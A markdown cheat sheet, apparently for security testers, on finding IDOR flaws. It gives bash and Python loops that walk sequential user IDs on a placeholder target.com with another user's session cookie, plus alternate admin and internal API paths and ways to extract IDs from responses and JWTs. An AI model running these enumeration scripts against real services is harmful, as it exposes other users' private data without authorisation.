# IDOR Sequential Enumeration

## Sequential ID Brute Force

### Bash Loop
```bash
for i in $(seq 1 100); do
    curl -s -H "Cookie: session=USER_B_SESSION" \
        "https://target.com/api/users/$i" | jq .
done
```

### Python Script
```python
import requests

session = "USER_B_SESSION"
for i in range(1, 101):
    r = requests.get(f"https://target.com/api/users/{i}",
                     cookies={"session": session})
    if r.status_code == 200:
        print(f"ID {i}: {r.json()}")
```

## Sequential ID in Different Formats

### Numeric
```
/user/1, /user/2, /user/3...
```

### UUID v1 (Time-based - Predictable)
```
# UUID v1 contains timestamp
# Can predict other users' UUIDs
# Time-based UUID: xxxxxxxx-xxxx-1xxx-xxxx-xxxxxxxxxxxx
```

### Short ID
```
/a, /b, /c... /aa, /ab...
# Base62 or Base64 encoded
```

### Hash-like
```
# May be MD5 of sequential ID
# Or HMAC with known key
```

## Multi-Endpoint IDOR

### Same Resource Different Paths
```bash
# Try all API versions
/api/v1/users/123
/api/v2/users/123
/api/internal/users/123
/admin/users/123
/staff/users/123
```

### Related Resources
```bash
# If you can access user 123
# Try their orders, files, profile
/api/users/123
/api/users/123/orders
/api/users/123/files
/api/users/123/profile
```

## Detection Tips

### Check Response for IDs
```bash
# Look in response body
curl -s https://target.com/api/me | jq '.id'
# Use returned ID to access other resources
```

### Check Headers
```bash
# Response headers may contain IDs
curl -sI https://target.com/api/me
# Look for: X-User-Id, X-Account-Id
```

### Check JWT/Session
```bash
# Decode JWT
echo "JWT_TOKEN" | base64 -d
# Look for: user_id, sub, uid, account_id
```
